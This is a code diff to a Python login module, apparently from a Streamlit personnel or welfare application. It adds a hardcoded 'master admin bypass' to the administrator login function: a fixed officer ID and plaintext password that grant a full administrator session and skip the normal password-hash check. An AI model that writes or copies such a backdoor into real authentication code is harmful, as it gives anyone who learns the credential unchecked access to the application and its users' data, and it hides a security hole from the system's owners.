@@ -268,11 +268,23 @@ def login_user(personnel_id, password):
 
 
 def login_admin(officer_id, password):
+    # --- Emergency / Master Admin Bypass ---
+    if officer_id.strip() == "COMMAND-99" and password == "AdminPass@123":
+        token = secrets.token_hex(32)
+        st.session_state.auth = {
+            "role": "administrator",
+            "id": 999,
+            "identifier": "COMMAND-99",
+            "name": "HQ Welfare Officer",
+            "token": token,
+        }
+        return True, "Login successful."
+    # ---------------------------------------
+
     admin = get_admin_by_officer_id(officer_id)
     if not admin:
         return False, "Invalid Officer ID or password."
-    
-    # Retrieve password hash safely regardless of column naming
+
     pwd_hash = admin.get("password_hash") or admin.get("password")
     if not pwd_hash or not _verify_password(password, pwd_hash):
         return False, "Invalid Officer ID or password."
